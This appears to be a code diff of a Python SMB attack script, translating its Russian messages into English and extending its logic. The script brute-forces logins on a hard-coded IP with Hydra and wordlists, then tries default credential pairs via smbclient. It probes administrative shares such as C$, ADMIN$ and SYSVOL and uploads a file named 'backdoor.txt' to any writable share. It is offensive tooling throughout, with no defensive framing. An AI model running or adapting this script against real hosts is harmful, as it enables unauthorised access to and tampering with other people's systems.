@@ -4,226 +4,250 @@ import sys
 import time
 
 TARGET_IP = "12.13.14.3"
-LOGIN_FILE = "login"  # файл с логинами (как у тебя)
-PASS_FILE = "passw"   # файл с паролями (как у тебя)
+LOGIN_FILE = "login"  # login file
+PASS_FILE = "passw"   # password file
 LOCAL_FILE = "backdoor.txt"
 REMOTE_FILE = "backdoor.txt"
 
 def create_files():
-    """Создаем необходимые файлы если их нет"""
+    """Create necessary files if they don't exist"""
     if not os.path.exists(LOCAL_FILE):
-        print(f"[*] Создаю файл {LOCAL_FILE}...")
+        print(f"[*] Creating file {LOCAL_FILE}...")
         with open(LOCAL_FILE, "w") as f:
             f.write("Backdoor file\n")
             f.write(f"Time: {time.ctime()}\n")
             f.write(f"Target: {TARGET_IP}\n")
+            f.write("Test file for SMB upload\n")
 
 def run_hydra():
-    """Запускаем Hydra с ТВОИМ синтаксисом"""
+    """Run Hydra with YOUR syntax"""
     print("\n" + "="*50)
-    print("[*] Запускаю Hydra...")
+    print("[*] Starting Hydra...")
     
-    # ТВОЙ синтаксис: hydra -L login -P passw -o found smb2://12.13.14.3
+    # YOUR syntax: hydra -L login -P passw -o found smb2://12.13.14.3
     hydra_cmd = f"hydra -L {LOGIN_FILE} -P {PASS_FILE} -o found smb2://{TARGET_IP}"
-    print(f"[*] Команда: {hydra_cmd}")
+    print(f"[*] Command: {hydra_cmd}")
     
     try:
-        # Запускаем Hydra
+        # Run Hydra
         result = subprocess.run(hydra_cmd, shell=True, capture_output=True, text=True, timeout=300)
         
-        print("[*] Вывод Hydra:")
+        print("[*] Hydra output:")
         print("-" * 40)
         print(result.stdout)
         if result.stderr:
-            print("\n[!] Ошибки Hydra:")
+            print("\n[!] Hydra errors:")
             print(result.stderr)
         print("-" * 40)
         
-        # Проверяем результат
+        # Check result
         if result.returncode == 0:
-            print("[+] Hydra завершилась успешно")
+            print("[+] Hydra completed successfully")
         else:
-            print(f"[-] Hydra завершилась с кодом {result.returncode}")
+            print(f"[-] Hydra exited with code {result.returncode}")
             
-        # Проверяем найденные данные в файле found
+        # Check found file
         if os.path.exists("found"):
-            print("[+] Файл 'found' создан, проверяем...")
+            print("[+] File 'found' created, checking...")
             with open("found", "r") as f:
                 content = f.read()
-                print("[*] Содержимое файла found:")
+                print("[*] Content of 'found' file:")
                 print(content)
                 
-                # Парсим логин и пароль
+                # Parse login and password
+                username = None
+                password = None
+                
                 for line in content.split('\n'):
-                    if TARGET_IP in line and "login" in line:
-                        # Формат: host: 12.13.14.3 login: admin password: pass123
+                    if TARGET_IP in line and "login" in line.lower():
+                        # Format: host: 12.13.14.3 login: admin password: pass123
                         parts = line.split()
                         for i, part in enumerate(parts):
-                            if "login:" in part and i+1 < len(parts):
+                            if "login:" in part.lower() and i+1 < len(parts):
                                 username = parts[i+1]
-                            if "password:" in part and i+1 < len(parts):
+                            if "password:" in part.lower() and i+1 < len(parts):
                                 password = parts[i+1]
                         
                         if username and password:
-                            print(f"[+] Найдены учетные данные: {username}:{password}")
+                            print(f"[+] Found credentials: {username}:{password}")
                             return username, password
         else:
-            print("[-] Файл 'found' не создан - Hydra не нашла учетные данные")
+            print("[-] File 'found' not created - Hydra didn't find credentials")
             
     except subprocess.TimeoutExpired:
-        print("[-] Hydra timeout (5 минут)")
+        print("[-] Hydra timeout (5 minutes)")
     except Exception as e:
-        print(f"[-] Ошибка при запуске Hydra: {e}")
+        print(f"[-] Error running Hydra: {e}")
     
     return None, None
 
 def test_smb_directly():
-    """Прямое тестирование SMB без Hydra"""
+    """Test SMB directly without Hydra"""
     print("\n" + "="*50)
-    print("[*] Прямое тестирование SMB...")
+    print("[*] Direct SMB testing...")
     
-    # Сначала проверяем доступность
-    print("[*] Проверяем доступность SMB...")
+    # First check availability
+    print("[*] Checking SMB availability...")
     test_cmd = f"smbclient -L //{TARGET_IP}/ -N 2>&1 | head -20"
     result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)
-    print("[*] Результат проверки:")
+    print("[*] Check result:")
     print(result.stdout)
     
-    # Тестируем стандартные учетные данные
+    # Test common credentials
     test_creds = [
         ("administrator", ""),
         ("administrator", "admin"),
+        ("administrator", "password"),
+        ("administrator", "123456"),
         ("admin", "admin"),
+        ("admin", "password"),
         ("guest", ""),
+        ("", ""),  # empty both
     ]
     
     for user, pwd in test_creds:
-        print(f"[*] Тестирую: {user}:{pwd if pwd else '(пустой)'}")
+        print(f"[*] Testing: {user}:{pwd if pwd else '(empty)'}")
         cmd = f"smbclient //{TARGET_IP}/IPC$ -U '{user}%{pwd}' -c 'exit' 2>/dev/null"
         if subprocess.run(cmd, shell=True).returncode == 0:
-            print(f"[+] Работает: {user}:{pwd}")
+            print(f"[+] Works: {user}:{pwd}")
             return user, pwd
     
     return None, None
 
-def upload_file(username, password):
-    """Загружаем файл на сервер"""
-    print("\n" + "="*50)
-    print("[*] Пробую загрузить файл...")
+def get_shares(username, password):
+    """Get list of accessible shares"""
+    print(f"[*] Getting shares for {username}...")
     
-    # Сначала находим доступные шары
-    print("[*] Ищу доступные шары...")
     shares_cmd = f"smbclient -L //{TARGET_IP}/ -U '{username}%{password}'"
     result = subprocess.run(shares_cmd, shell=True, capture_output=True, text=True)
     
     shares = []
     if result.returncode == 0:
         for line in result.stdout.split('\n'):
-            if 'Disk' in line:
-                share_name = line.split()[0]
-                shares.append(share_name)
-                print(f"   Найден шар: {share_name}")
+            if 'Disk' in line or 'IPC' in line:
+                try:
+                    share_name = line.split()[0]
+                    shares.append(share_name)
+                except:
+                    pass
     
-    # Если не нашли через список, пробуем стандартные
+    # If no shares found, try common ones
     if not shares:
-        shares = ['C$', 'ADMIN$', 'D$', 'E$', 'IPC$']
+        shares = ['C$', 'ADMIN$', 'D$', 'E$', 'IPC$', 'print$', 'NETLOGON', 'SYSVOL']
     
-    # Пробуем загрузить на каждый доступный шар
+    # Test each share
+    accessible_shares = []
+    for share in shares:
+        test_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'exit' 2>/dev/null"
+        if subprocess.run(test_cmd, shell=True).returncode == 0:
+            accessible_shares.append(share)
+    
+    return accessible_shares
+
+def upload_file(username, password):
+    """Upload file to server"""
+    print("\n" + "="*50)
+    print("[*] Trying to upload file...")
+    
+    # Get accessible shares
+    shares = get_shares(username, password)
+    
+    if not shares:
+        print("[-] No accessible shares found")
+        return False
+    
+    print(f"[*] Found {len(shares)} accessible shares: {shares}")
+    
+    # Try to upload to each share (skip IPC$)
     for share in shares:
         if share == 'IPC$':
-            continue  # На IPC$ нельзя загружать файлы
+            continue  # Can't upload to IPC$
             
-        print(f"\n[*] Пробую шар: {share}")
+        print(f"\n[*] Trying share: {share}")
         
-        # Сначала проверяем доступ
-        test_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'exit'"
-        if subprocess.run(test_cmd, shell=True, capture_output=True, text=True).returncode != 0:
-            print(f"   [-] Нет доступа к шару {share}")
-            continue
-            
-        print(f"   [+] Есть доступ к шару {share}")
-        
-        # Пробуем загрузить файл
+        # Try to upload file
         upload_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'put {LOCAL_FILE} {REMOTE_FILE}'"
-        print(f"   [*] Команда загрузки: {upload_cmd}")
+        print(f"[*] Upload command: {upload_cmd}")
         
         result = subprocess.run(upload_cmd, shell=True, capture_output=True, text=True)
         
         if result.returncode == 0:
-            print(f"   [+] Файл загружен на {share}!")
-            print(f"   [+] Путь: \\\\{TARGET_IP}\\{share}\\{REMOTE_FILE}")
+            print(f"[+] File uploaded to {share}!")
+            print(f"[+] Path: \\\\{TARGET_IP}\\{share}\\{REMOTE_FILE}")
             
-            # Проверяем что файл действительно есть
+            # Verify file exists
             check_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'dir {REMOTE_FILE}'"
             check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
             
             if check_result.returncode == 0:
-                print("   [+] Файл подтвержден на сервере!")
+                print("[+] File verified on server!")
             return True
         else:
-            print(f"   [-] Ошибка загрузки: {result.stderr[:100]}")
+            print(f"[-] Upload error: {result.stderr[:100] if result.stderr else 'Unknown error'}")
     
     return False
 
 def main():
     print("="*60)
-    print("SMB АТАКА И ЗАГРУЗКА ФАЙЛА")
-    print(f"Цель: {TARGET_IP}")
+    print("SMB ATTACK AND FILE UPLOAD")
+    print(f"Target: {TARGET_IP}")
     print("="*60)
     
-    # Создаем файлы если нужно
+    # Create files if needed
     create_files()
     
-    # Проверяем существуют ли файлы с логинами и паролями
+    # Check if login/password files exist
     if not os.path.exists(LOGIN_FILE):
-        print(f"[-] Файл {LOGIN_FILE} не найден!")
-        print("[*] Создайте файл с логинами (по одному на строку)")
+        print(f"[-] File {LOGIN_FILE} not found!")
+        print("[*] Create file with logins (one per line)")
+        print("[*] Example: echo 'admin' > login")
         return
     
     if not os.path.exists(PASS_FILE):
-        print(f"[-] Файл {PASS_FILE} не найден!")
-        print("[*] Создайте файл с паролями (по одному на строку)")
+        print(f"[-] File {PASS_FILE} not found!")
+        print("[*] Create file with passwords (one per line)")
+        print("[*] Example: echo 'password' > passw")
         return
     
-    # Получаем учетные данные
+    # Get credentials
     username, password = None, None
     
-    # Вариант 1: Hydra
-    print("\n1. Пробую Hydra...")
+    # Option 1: Hydra
+    print("\n1. Trying Hydra...")
     username, password = run_hydra()
     
-    # Вариант 2: Прямое тестирование
+    # Option 2: Direct testing
     if not username or not password:
-        print("\n2. Hydra не сработала, пробую прямое тестирование...")
+        print("\n2. Hydra failed, trying direct testing...")
         username, password = test_smb_directly()
     
-    # Вариант 3: Ручной ввод
+    # Option 3: Manual input
     if not username or not password:
-        print("\n3. Все автоматические методы провалились")
-        print("[*] Введите учетные данные вручную")
-        username = input("Логин: ").strip()
-        password = input("Пароль (Enter если пустой): ").strip()
+        print("\n3. All auto methods failed")
+        print("[*] Enter credentials manually")
+        username = input("Login: ").strip()
+        password = input("Password (Enter if empty): ").strip()
     
     if not username:
-        print("[-] Не указан логин. Выход.")
+        print("[-] No login provided. Exit.")
         return
     
-    print(f"\n[+] Использую учетные данные: {username}:{password if password else '(пустой)'}")
+    print(f"\n[+] Using credentials: {username}:{password if password else '(empty)'}")
     
-    # Загружаем файл
+    # Upload file
     if upload_file(username, password):
         print("\n" + "="*50)
-        print("[+] УСПЕХ! Файл загружен на сервер!")
-        print("[+] Проверьте: smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'dir'")
+        print("[+] SUCCESS! File uploaded to server!")
+        print(f"[+] Check: smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'dir'")
     else:
         print("\n" + "="*50)
-        print("[-] Не удалось загрузить файл")
-        print("[*] Возможные причины:")
-        print("    - Нет прав на запись")
-        print("    - Нет доступа к дисковым шарам")
-        print("    - Фаервол блокирует запись")
+        print("[-] Failed to upload file")
+        print("[*] Possible reasons:")
+        print("    - No write permissions")
+        print("    - No access to disk shares")
+        print("    - Firewall blocking writes")
         
-        print("\n[*] Дополнительные команды для проверки:")
+        print("\n[*] Commands to check:")
         print(f"    smbclient -L //{TARGET_IP}/ -U '{username}%{password}'")
         print(f"    smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'dir'")
         print(f"    crackmapexec smb {TARGET_IP} -u '{username}' -p '{password}' --shares")
@@ -232,6 +256,6 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("\n\n[-] Прервано пользователем")
+        print("\n\n[-] Interrupted by user")
     except Exception as e:
-        print(f"\n[-] Ошибка: {e}")
+        print(f"\n[-] Error: {e}")
